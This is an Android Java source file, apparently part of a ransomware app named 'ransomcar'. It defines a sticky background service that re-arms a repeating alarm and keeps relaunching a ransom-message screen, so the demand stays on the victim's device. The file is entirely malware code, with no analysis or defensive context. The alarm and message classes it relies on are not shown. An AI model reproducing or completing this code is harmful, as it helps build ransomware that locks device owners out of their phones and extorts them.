package com.example.ransomcar;

import java.util.List;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class RansomNotification extends Service {
	AlarmRepeater alarm = new AlarmRepeater();
	
	public void onCreate() {
	        super.onCreate();
	}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    	// set the alarm service
    	alarm.SetAlarm(RansomNotification.this);
    	Context context = getBaseContext();
    	// start the ransom message
    	if(isMyActivityRunning(context)){
    		Intent ransom = new Intent(context, RansomMessage.class);
    		ransom.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    		context.startActivity(ransom);}
    	return START_STICKY;
    }

    public void onStart(Context context,Intent intent, int startId) {
        alarm.SetAlarm(context);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    // check is app is running
    public boolean isMyActivityRunning(Context context){
      	String myPackage="com.example.ransomcar";
      	ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
      	 List< ActivityManager.RunningTaskInfo > runningTaskInfo = manager.getRunningTasks(1); 
      	     ComponentName componentInfo = runningTaskInfo.get(0).topActivity;
      	   if(componentInfo.getPackageName().equals(myPackage)) return true;
      	return false;
    }
}